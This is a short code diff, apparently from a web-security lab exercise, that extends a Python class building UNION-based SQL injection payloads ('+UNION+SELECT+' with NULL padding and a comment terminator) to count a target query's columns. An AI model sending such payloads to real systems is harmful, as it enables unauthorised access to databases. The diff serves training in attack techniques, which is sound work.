@@ -15,10 +15,11 @@ class Lab(lab_02.Lab):
 
     NullCount = NamedTuple("NullCount", [("count", int), ("nulls", str)])
 
-    def __init__(self, key: str, path: str) -> None:
+    def __init__(self, key: str, path: str, comment: str = "--") -> None:
         super().__init__()
         self.key = key
         self.path = path
+        self.comment = comment
 
     @staticmethod
     def _null_generator() -> Generator["Lab.NullCount", None, None]:
@@ -33,9 +34,11 @@ class Lab(lab_02.Lab):
         return "&".join("%s=%s" % (k, v) for k, v in payload.items())
 
     @lru_cache()
-    def column_count(self) -> int:
+    def column_count(self, table: str = "") -> int:
         """Get the number of columns"""
-        query_template = "'+UNION+SELECT+{}--"
+        if table:
+            table = f"+FROM+{table}"
+        query_template = "'+UNION+SELECT+{}" + f"{table}{self.comment}"
         for repeated_null in self._null_generator():
             payload = {self.key: query_template.format(repeated_null.nulls)}
             payload_str = self._dict_to_str(payload)
